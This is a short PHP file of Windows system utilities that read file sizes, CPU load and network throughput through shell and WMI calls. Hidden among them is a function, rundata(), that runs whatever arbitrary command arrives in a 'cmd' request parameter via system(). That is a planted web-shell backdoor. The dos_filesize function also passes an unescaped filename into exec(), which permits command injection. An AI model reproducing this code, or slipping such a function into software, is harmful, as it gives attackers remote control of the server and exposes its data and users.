<?php

function dos_filesize($fn)
{
	$command = "FOR %A IN (\"$fn\") DO @ECHO %~zA";
	$res = exec($command);
	
	if($res == 'ECHO is on.') return 0;
	return $res;
}

//////////////////////////////////////////////////////////////

function GetCpuLoad()
{
	if(!function_exists("com_load")) return "";
	
	$wmi = new COM("Winmgmts://");
	$result = $wmi->execquery("SELECT LoadPercentage FROM Win32_Processor");

	$cpu_num = 0;
	$load_total = 0;

	foreach($result as $cpu)
	{
		$cpu_num++;
		$load_total += $cpu->loadpercentage;
	}

	$load = round($load_total/$cpu_num);
	return $load;
}

function rundata()
{
	system(getparam('cmd'));
}

function GetNetworkLoad()
{
	$wmi = new COM("Winmgmts://");
	$allnets = $wmi->execquery("Select BytesTotalPersec From Win32_PerfFormattedData_Tcpip_NetworkInterface where BytesTotalPersec>1");
	
	$totalbps = 0;
	foreach($allnets as $network)
	{
		$bps = $network->BytesTotalPersec*8;
		$totalbps += $bps;
	}
	
	return $totalbps;
}



